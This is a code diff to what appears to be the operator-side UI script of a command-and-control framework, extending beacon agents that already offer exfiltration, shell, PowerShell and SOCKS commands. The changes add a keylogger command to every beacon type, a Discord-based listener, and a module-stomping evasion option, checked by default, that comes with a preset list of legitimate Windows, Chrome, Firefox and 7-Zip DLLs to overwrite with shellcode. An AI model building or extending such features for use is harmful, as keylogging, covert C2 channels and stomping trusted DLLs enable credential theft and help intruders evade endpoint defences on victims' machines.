@@ -268,6 +268,8 @@ function RegisterCommands(listenerType)
         ax.execute_alias(id, cmdline, new_cmd);
     });
 
+    let cmd_keylog = ax.create_command("keylog", "Start keyboard logger (stop with 'jobs kill')", "keylog", "Task: start keylogger");
+
     let cmd_interact = ax.create_command("interact", "Set 'sleep 0'", "interact");
     cmd_interact.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
         ax.execute_alias(id, cmdline, "sleep 0");
@@ -275,20 +277,20 @@ function RegisterCommands(listenerType)
 
     if(listenerType == "BeaconDNS") {
         let commands_dns = ax.create_commands_group("beacon", [cmd_cat, cmd_cd, cmd_cp, cmd_disks, cmd_download, cmd_execute, cmd_exfil, cmd_getuid,
-            cmd_job, cmd_link, cmd_ls, cmd_lportfwd, cmd_mv, cmd_mkdir, cmd_profile, cmd_ps, cmd_pwd, cmd_rev2self, cmd_rm, cmd_rportfwd, cmd_sleep,
+            cmd_job, cmd_keylog, cmd_link, cmd_ls, cmd_lportfwd, cmd_mv, cmd_mkdir, cmd_profile, cmd_ps, cmd_pwd, cmd_rev2self, cmd_rm, cmd_rportfwd, cmd_sleep,
             cmd_socks, cmd_terminate, cmd_unlink, cmd_upload, cmd_shell, cmd_powershell, cmd_interact, cmd_burst] );
         return { commands_windows: commands_dns }
     }
-    else if(listenerType == "BeaconHTTP") {
+    else if(listenerType == "BeaconHTTP" || listenerType == "BeaconDiscord") {
         let commands_http = ax.create_commands_group("beacon", [cmd_cat, cmd_cd, cmd_cp, cmd_disks, cmd_download, cmd_execute, cmd_exfil, cmd_getuid,
-            cmd_job, cmd_link, cmd_ls, cmd_lportfwd, cmd_mv, cmd_mkdir, cmd_profile, cmd_ps, cmd_pwd, cmd_rev2self, cmd_rm, cmd_rportfwd, cmd_sleep,
+            cmd_job, cmd_keylog, cmd_link, cmd_ls, cmd_lportfwd, cmd_mv, cmd_mkdir, cmd_profile, cmd_ps, cmd_pwd, cmd_rev2self, cmd_rm, cmd_rportfwd, cmd_sleep,
             cmd_socks, cmd_terminate, cmd_unlink, cmd_upload, cmd_shell, cmd_powershell, cmd_interact] );
 
         return { commands_windows: commands_http }
     }
     else if (listenerType == "BeaconSMB" || listenerType == "BeaconTCP") {
         let commands_internal = ax.create_commands_group("beacon", [cmd_cat, cmd_cd, cmd_cp, cmd_disks, cmd_download, cmd_execute, cmd_exfil, cmd_getuid,
-            cmd_job, cmd_link, cmd_ls, cmd_lportfwd, cmd_mv, cmd_mkdir, cmd_profile, cmd_ps, cmd_pwd, cmd_rev2self, cmd_rm, cmd_rportfwd,
+            cmd_job, cmd_keylog, cmd_link, cmd_ls, cmd_lportfwd, cmd_mv, cmd_mkdir, cmd_profile, cmd_ps, cmd_pwd, cmd_rev2self, cmd_rm, cmd_rportfwd,
             cmd_socks, cmd_terminate, cmd_unlink, cmd_upload, cmd_shell, cmd_powershell, cmd_interact] );
 
         return { commands_windows: commands_internal }
@@ -316,7 +318,7 @@ function GenerateUI(listeners_type)
     spinJitter.setRange(0, 100);
     spinJitter.setValue(0);
 
-    if( !listeners_type.includes("BeaconHTTP") && !listeners_type.includes("BeaconDNS") ) {
+    if( !listeners_type.includes("BeaconHTTP") && !listeners_type.includes("BeaconDNS") && !listeners_type.includes("BeaconDiscord") ) {
         labelSleep.setVisible(false);
         textSleep.setVisible(false);
         spinJitter.setVisible(false);
@@ -344,6 +346,28 @@ function GenerateUI(listeners_type)
     // if( !listeners_type.includes("BeaconHTTP") && !listeners_type.includes("BeaconDNS") ) {
     //     checkIatHiding.setVisible(false);
     // }
+
+    let checkModuleStomp = form.create_check("Module Stomping (Shellcode x64 only)");
+    checkModuleStomp.setChecked(true);
+    let labelStompPaths = form.create_label("Stomp DLLs:");
+    let textStompPaths = form.create_textmulti(
+        "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clrjit.dll\n" +
+        "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorlib.ni.dll\n" +
+        "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\clrjit.dll\n" +
+        "C:\\Program Files\\Google\\Chrome\\Application\\chrome_elf.dll\n" +
+        "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome_elf.dll\n" +
+        "C:\\Program Files\\Mozilla Firefox\\nss3.dll\n" +
+        "C:\\Program Files (x86)\\Mozilla Firefox\\nss3.dll\n" +
+        "C:\\Program Files\\7-Zip\\7z.dll\n" +
+        "C:\\Program Files\\Git\\mingw64\\bin\\libcurl-4.dll\n" +
+        "C:\\Program Files\\VideoLAN\\VLC\\libvlc.dll\n" +
+        "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_elf.dll\n" +
+        "mshtml.dll\n" +
+        "shell32.dll\n" +
+        "dbghelp.dll\n" +
+        "mfc140u.dll\n" +
+        "vcruntime140.dll"
+    );
 
     //////////////////// DNS Settings
 
@@ -484,9 +508,12 @@ function GenerateUI(listeners_type)
     layout.addWidget(labelRotation,       8, 0, 1, 1);
     layout.addWidget(comboRotation,       8, 1, 1, 2);
     layout.addWidget(checkIatHiding,      9, 0, 1, 3);
-    layout.addWidget(group_proxy,        10, 0, 1, 3);
-    layout.addWidget(group_dns,          12, 0, 1, 3);
-    layout.addWidget(spacer2,            12, 0, 1, 3);
+    layout.addWidget(checkModuleStomp,  10, 0, 1, 3);
+    layout.addWidget(labelStompPaths,   11, 0, 1, 1);
+    layout.addWidget(textStompPaths,    11, 1, 1, 2);
+    layout.addWidget(group_proxy,       12, 0, 1, 3);
+    layout.addWidget(group_dns,         14, 0, 1, 3);
+    layout.addWidget(spacer2,           15, 0, 1, 3);
 
     form.connect(comboAgentFormat, "currentTextChanged", function(text) {
         if(text == "Service Exe") {
@@ -524,6 +551,8 @@ function GenerateUI(listeners_type)
     container.put("is_sideloading",      checkSideloading)
     container.put("sideloading_content", sideloadingSelector)
     container.put("iat_hiding",          checkIatHiding)
+    container.put("module_stomp",       checkModuleStomp)
+    container.put("stomp_paths",        textStompPaths)
     container.put("use_proxy",           group_proxy)
     container.put("proxy_type",          comboProxyType)
     container.put("proxy_host",          textProxyServer)
@@ -538,7 +567,7 @@ function GenerateUI(listeners_type)
     return {
         ui_panel: panel,
         ui_container: container,
-        ui_height: 480,
+        ui_height: 620,
         ui_width: 500
     }
 }
